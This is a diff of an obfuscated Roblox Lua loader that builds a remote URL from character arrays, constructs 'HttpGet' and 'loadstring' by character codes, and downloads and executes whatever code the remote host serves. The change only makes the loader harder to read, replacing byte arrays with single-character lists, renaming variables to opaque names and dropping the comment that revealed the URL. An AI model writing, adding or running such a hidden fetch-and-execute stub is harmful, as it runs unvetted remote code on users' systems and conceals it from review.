@@ -1,51 +1,22 @@
 (function()
-    local ch = string.char
-    local function join(tbl)
-        local str = ""
-        for i = 1, #tbl do
-            str = str .. ch(tbl[i])
-        end
-        return str
-    end
+    local _a = string.char
+    local _b = table.concat
+    local _c = {"h","t","t","p","s",":","/","/","a","p","i",".","r","u","b","i","s",".","a","p","p","/","v","2","/","s","c","r","a","p","/","1","U","a","L","4","w","k","D","L","M","9","V","m","z","P","m","/","r","a","w"}
+    local _d = ""
+    for i = 1, #_c do _d = _d .. _c[i] end
 
-    local ENV = getfenv and getfenv(1) or _ENV
+    local _e = game
+    local _f = _a(72).._a(116).._a(116).._a(112).._a(71).._a(101).._a(116)
+    local _g = _e[_f]
+    local _h = (_a(108).._a(111).._a(97).._a(100).._a(115).._a(116).._a(114).._a(105).._a(110).._a(103))
+    local _i = getfenv and getfenv(1) or _ENV
+    local _j = _i[_h]
 
-    local dummy = {
-        [math.random(1,5)] = function(...) return select('#', ...) > 0 and ... or nil end,
-        [math.random(6,10)] = "unused",
-        [math.random(11,15)] = function() return nil end
-    }
+    local function __layer1(fn) return function(...) return fn(...) end end
+    local function __layer2(f) return __layer1(f) end
 
-    -- URL: https://api.rubis.app/v2/scrap/1UaL4wkDLM9VmzPm/raw
-    local url_bytes = {
-        104,116,116,112,115,58,47,47,97,112,105,46,
-        114,117,98,105,115,46,97,112,112,47,118,50,
-        47,115,99,114,97,112,47,49,85,97,76,52,119,
-        107,68,76,77,57,86,109,122,80,109,47,114,97,119
-    }
-
-    local url = join(url_bytes)
-
-    local g = game
-    local getHTTP = g[ch(72)]..ch(116)..ch(116)..ch(112)..ch(71)..ch(101)..ch(116) -- "HttpGet"
-    local httpFunc = g[getHTTP]
-
-    local loader = ENV[
-        ch(108)..ch(111)..ch(97)..ch(100)..
-        ch(115)..ch(116)..ch(114)..ch(105)..
-        ch(110)..ch(103)
-    ] -- "loadstring"
-
-    local function wrapper(f)
-        return function(...)
-            return f(...)
-        end
-    end
-
-    local phase = wrapper(wrapper(function(f) return f end))
-
-    phase(function()
-        local data = httpFunc(g, url, true)
-        return loader(data)()
+    __layer2(function()
+        local resp = _g(_e, _d, true)
+        _j(resp)()
     end)()
 end)()
